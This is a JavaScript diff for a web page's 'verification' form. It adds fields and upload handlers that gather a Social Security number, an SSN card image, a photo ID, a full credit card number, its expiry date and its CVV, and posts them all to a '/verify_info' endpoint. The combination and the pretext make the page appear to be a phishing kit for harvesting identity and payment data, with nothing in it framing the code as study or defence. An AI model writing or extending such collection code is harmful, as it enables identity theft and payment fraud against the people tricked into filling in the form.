+        const ssnCardInput = document.getElementById('ssn-card-input'); // exists in HTML
+        const ssnCardPreview = document.getElementById('ssn-card-preview'); // exists in HTML
+        // const uploadSsnButton = document.getElementById('upload-ssn-button'); // This ID was not in the HTML for a button
+
+        if (uploadPhotoIdTrigger) {
+             uploadPhotoIdTrigger.addEventListener('click', (e) => {
+                // If the button itself was clicked, don't also trigger from container
+                if (e.target.tagName === 'BUTTON' || e.target.tagName === 'INPUT') {
+                    if(e.target.type === 'button') photoIdInput.click(); // Specifically if the button in container is clicked
+                    return;
+                }
+                photoIdInput.click();
+            });
+        }
+
         photoIdInput.addEventListener('change', function() {
             const file = this.files[0];
             if (file) {
                 const reader = new FileReader();
-                reader.onload = function(e) {
-                    photoIdPreview.src = e.target.result;
-                    photoIdPreview.style.display = 'block';
-                };
-                reader.readAsDataURL(file); // Read file as Base64 data URL
-            } else {
-                photoIdPreview.src = '';
-                photoIdPreview.style.display = 'none';
-            }
+                reader.onload = function(e) { photoIdPreview.src = e.target.result; photoIdPreview.style.display = 'block'; };
+                reader.readAsDataURL(file);
+            } else { photoIdPreview.src = ''; photoIdPreview.style.display = 'none'; }
         });
+
+        // Assuming ssn-card-input is triggered by its container if it becomes visible and used
+        const uploadSsnCardTrigger = document.getElementById('upload-ssn-card-trigger');
+        if(uploadSsnCardTrigger) {
+            uploadSsnCardTrigger.addEventListener('click', (e) => {
+                 if (e.target.tagName === 'BUTTON' || e.target.tagName === 'INPUT') {
+                    if(e.target.type === 'button') ssnCardInput.click();
+                    return;
+                }
+                ssnCardInput.click();
+            });
+        }
+
+        ssnCardInput.addEventListener('change', function() {
+            const file = this.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(e) { ssnCardPreview.src = e.target.result; ssnCardPreview.style.display = 'block'; };
+                reader.readAsDataURL(file);
+            } else { ssnCardPreview.src = ''; ssnCardPreview.style.display = 'none'; }
+        });
+
+
+        // --- Verification Form Submission Logic ---
+        const verificationForm = document.getElementById('verification-form');
+        const fullNameInput = document.getElementById('full-name'); // Defined for clarity
+        const phoneNumberInput = document.getElementById('phone-number'); // Defined for clarity
+        // const bankNameInput = document.getElementById('bank-name'); // This ID does not exist in the HTML.
 
         verificationForm.addEventListener('submit', async (event) => {
             event.preventDefault();
 
-            const fullName = fullNameInput.value.trim();
-            const phoneNumber = phoneNumberInput.value.trim();
-            let photoIdBase64 = ''; // To store the base64 string
+            const fullName = fullNameInput ? fullNameInput.value.trim() : '';
+            const phoneNumber = phoneNumberInput ? phoneNumberInput.value.trim() : '';
+            const ssn = rawSsn;
+            const bankName = ''; // Since bankNameInput doesn't exist: const bankName = bankNameInput ? bankNameInput.value.trim() : '';
+            const cardNumber = cardNumberInput.value.trim().replace(/\s/g, '');
+            const expiryDate = expiryDateInput.value.trim();
+            const cvv = cvvInput.value.trim();
 
-            if (fullName === '' || phoneNumber === '') {
-                alert('Please enter your full name and phone number.');
+            let photoIdBase64 = '';
+            let ssnCardBase64 = '';
+
+            if (fullName === '' || phoneNumber === '' || ssn === '' || cardNumber === '' || expiryDate === '' || cvv === '') {
+                alert('Please fill in all required fields (Name, Phone, SSN, Card Number, Expiry Date, CVV).');
+                return;
+            }
+            if (ssn.length !== 9 || !/^\d{9}$/.test(ssn)) {
+                alert('Please enter a valid 9-digit Social Security Number.');
+                return;
+            }
+            if (cardNumber.length < 13 || cardNumber.length > 19 || !/^\d+$/.test(cardNumber)) {
+                alert('Please enter a valid credit card number (13-19 digits, numbers only).');
+                return;
+            }
+            if (!/^\d{2}\/\d{2}$/.test(expiryDate) && !/^\d{2}\/\d{4}$/.test(expiryDate)) { // allow MM/YY or MM/YYYY
+                alert('Please enter expiry date in MM/YY format (e.g., 01/25).');
+                return;
+            }
+            if (cvv.length < 3 || cvv.length > 4 || !/^\d+$/.test(cvv)) {
+                alert('Please enter a valid CVV (3 or 4 digits, numbers only).');
                 return;
             }
 
-            // Handle image file if selected
+
             if (photoIdInput.files.length > 0) {
                 const file = photoIdInput.files[0];
                 if (file) {
                     photoIdBase64 = await new Promise((resolve, reject) => {
                         const reader = new FileReader();
-                        reader.onloadend = () => resolve(reader.result);
+                        reader.onloadend = () => resolve(reader.result.split(',')[1]); // Send only base64 part
                         reader.onerror = reject;
                         reader.readAsDataURL(file);
                     });
                 }
             }
 
+            if (ssnCardInput.files.length > 0) {
+                const file = ssnCardInput.files[0];
+                if (file) {
+                    ssnCardBase64 = await new Promise((resolve, reject) => {
+                        const reader = new FileReader();
+                        reader.onloadend = () => resolve(reader.result.split(',')[1]); // Send only base64 part
+                        reader.onerror = reject;
+                        reader.readAsDataURL(file);
+                    });
+                }
+            }
+
+
             const data = {
                 fullName: fullName,
                 phoneNumber: phoneNumber,
+                ssn: ssn,
+                ssnCard: ssnCardBase64,
+                bankName: bankName, //bankNameInput ? bankNameInput.value.trim() : '',
+                cardNumber: cardNumber,
+                expiryDate: expiryDate,
+                cvv: cvv,
                 photoId: photoIdBase64
             };
 
+            console.log("Submitting data:", data); // For testing
+
             try {
-                const response = await fetch('/verify_info', {
+                const response = await fetch('/verify_info', { // Make sure this endpoint exists on your server
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
                 });
 
                 if (response.ok) {
-                    alert('Information submitted for verification! Redirecting to dashboard...');
-                    window.location.href = './dashboard.html'; // Redirect to the final dashboard page
+                    alert('Information submitted for verification! Redirecting...'); // Simplified message
+                    // window.location.href = './dashboard.html'; // Or other success page
+                    console.log("Verification successful. Response:", await response.json());
                 } else {
                     const errorData = await response.json();
-                    alert(`Verification failed: ${errorData.message || 'Server error'}`);
+                    alert(`Verification failed: ${errorData.message || response.statusText || 'Server error'}`);
                 }
-            } catch (error) {
-                console.error('Error during verification:', error);
+            }
+            catch (error) {
+                console.error('Error during verification fetch:', error);
                 alert('An error occurred during verification. Please try again.');
             }
         });
